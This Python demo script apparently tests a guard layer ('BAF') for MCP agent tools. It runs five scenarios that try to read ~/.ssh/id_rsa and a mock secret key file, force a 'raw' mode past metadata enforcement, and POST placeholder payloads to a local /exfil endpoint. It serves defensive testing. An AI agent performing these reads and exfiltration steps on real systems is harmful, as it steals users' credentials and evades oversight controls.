# examples/mcp_baf_tools/demo_baf_exfil.py

import os
import sys

from baf_core.session import BAFSession, BAFConfig

CONFIG_PATH = "baf_config.dev_laptop.yaml"

SECRET_PATH = "examples/exam_helper_v1/data/secrets/secret_api_key.txt"
SAFE_PATH = "examples/exam_helper_v1/data/personal_docs/college_id_mock_1.txt"
EXFIL_URL = "http://127.0.0.1:5000/exfil"


def make_baf_session() -> BAFSession:
    cfg = BAFConfig.from_file(CONFIG_PATH)
    return BAFSession(
        config=cfg,
        agent_id="mcp_baf_demo_client",
        session_label=os.getenv("BAF_SESSION_LABEL"),
    )


def scenario_ssh_key_exfil(baf: BAFSession) -> None:
    # Simulate "read ~/.ssh/id_rsa and POST it"
    ssh_path = os.path.expanduser("~/.ssh/id_rsa")
    print("[BAF MCP] Attempting to read SSH key via safe_read_file...")
    try:
        content = baf.safe_read_file(path=ssh_path, profile=os.getenv("BAF_PROFILE"))
        print("[BAF MCP] SSH key safe_read_file result:", repr(content))
    except Exception as e:
        print("[BAF MCP] ERROR reading SSH key via BAF:", repr(e))

    print("[BAF MCP] Attempting HTTP exfil via BAF http_post...")
    try:
        resp = baf.http_post(
            url=EXFIL_URL,
            data="mcp ssh_key_exfil payload",
            profile=os.getenv("BAF_PROFILE"),
        )
        print("[BAF MCP] HTTP RESULT:", resp.status_code)
    except Exception as e:
        print("[BAF MCP] HTTP ERROR:", repr(e))


def scenario_secret_file_exfil(baf: BAFSession) -> None:
    print("[BAF MCP] Reading secret file via safe_read_file...")
    try:
        content = baf.safe_read_file(path=SECRET_PATH, profile=os.getenv("BAF_PROFILE"))
        print("[BAF MCP] SECRET safe_read_file result:", repr(content))
    except Exception as e:
        print("[BAF MCP] ERROR reading secret:", repr(e))

    print("[BAF MCP] Attempting HTTP exfil via BAF http_post...")
    try:
        resp = baf.http_post(
            url=EXFIL_URL,
            data="mcp secret_file_exfil payload",
            profile=os.getenv("BAF_PROFILE"),
        )
        print("[BAF MCP] HTTP RESULT:", resp.status_code)
    except Exception as e:
        print("[BAF MCP] HTTP ERROR:", repr(e))


def scenario_bypass_metadata(baf: BAFSession) -> None:
    print("[BAF MCP] Trying to bypass metadata and get raw secret...")
    try:
        # Attacker tries to force raw mode, but BAF config should still enforce metadata
        content = baf.safe_read_file(
            path=SECRET_PATH,
            profile=os.getenv("BAF_PROFILE"),
            mode="raw",
        )
        print("[BAF MCP] BYPASS_METADATA safe_read_file result:", repr(content))
    except Exception as e:
        print("[BAF MCP] ERROR in bypass_metadata:", repr(e))

    print("[BAF MCP] Attempting HTTP exfil via BAF http_post...")
    try:
        resp = baf.http_post(
            url=EXFIL_URL,
            data="mcp bypass_metadata payload",
            profile=os.getenv("BAF_PROFILE"),
        )
        print("[BAF MCP] HTTP RESULT:", resp.status_code)
    except Exception as e:
        print("[BAF MCP] HTTP ERROR:", repr(e))


def scenario_jailbreak_exfil(baf: BAFSession) -> None:
    print("[BAF MCP] Jailbreak-style: read any secrets and exfiltrate via HTTP...")
    try:
        content = baf.safe_read_file(path=SECRET_PATH, profile=os.getenv("BAF_PROFILE"))
        print("[BAF MCP] JAILBREAK safe_read_file result:", repr(content))
    except Exception as e:
        print("[BAF MCP] ERROR in jailbreak_exfil:", repr(e))

    print("[BAF MCP] Attempting HTTP exfil via BAF http_post...")
    try:
        resp = baf.http_post(
            url=EXFIL_URL,
            data="mcp jailbreak_exfil payload",
            profile=os.getenv("BAF_PROFILE"),
        )
        print("[BAF MCP] HTTP RESULT:", resp.status_code)
    except Exception as e:
        print("[BAF MCP] HTTP ERROR:", repr(e))


def scenario_polymorphic_exfil(baf: BAFSession) -> None:
    print("[BAF MCP] Polymorphic exfil: read personal + secret then HTTP exfil...")
    try:
        personal = baf.safe_read_file(path=SAFE_PATH, profile=os.getenv("BAF_PROFILE"))
        print("[BAF MCP] PERSONAL safe_read_file result:", repr(personal))
    except Exception as e:
        print("[BAF MCP] ERROR reading personal:", repr(e))

    try:
        secret = baf.safe_read_file(path=SECRET_PATH, profile=os.getenv("BAF_PROFILE"))
        print("[BAF MCP] SECRET safe_read_file result:", repr(secret))
    except Exception as e:
        print("[BAF MCP] ERROR reading secret:", repr(e))

    print("[BAF MCP] Attempting HTTP exfil via BAF http_post...")
    try:
        resp = baf.http_post(
            url=EXFIL_URL,
            data="mcp polymorphic_exfil payload",
            profile=os.getenv("BAF_PROFILE"),
        )
        print("[BAF MCP] HTTP RESULT:", resp.status_code)
    except Exception as e:
        print("[BAF MCP] HTTP ERROR:", repr(e))


SCENARIO_FUNCS = {
    "ssh_key_exfil": scenario_ssh_key_exfil,
    "secret_file_exfil": scenario_secret_file_exfil,
    "bypass_metadata": scenario_bypass_metadata,
    "jailbreak_exfil": scenario_jailbreak_exfil,
    "polymorphic_exfil": scenario_polymorphic_exfil,
}


def main():
    if len(sys.argv) < 2:
        print("Usage: python -m examples.mcp_baf_tools.demo_baf_exfil <scenario_id>")
        sys.exit(1)

    scenario_id = sys.argv[1]
    func = SCENARIO_FUNCS.get(scenario_id)
    if func is None:
        print(f"Unknown scenario_id: {scenario_id}")
        sys.exit(1)

    baf = make_baf_session()
    print(f"[BAF MCP] Running scenario: {scenario_id} profile={os.getenv('BAF_PROFILE')}")
    func(baf)


if __name__ == "__main__":
    main()
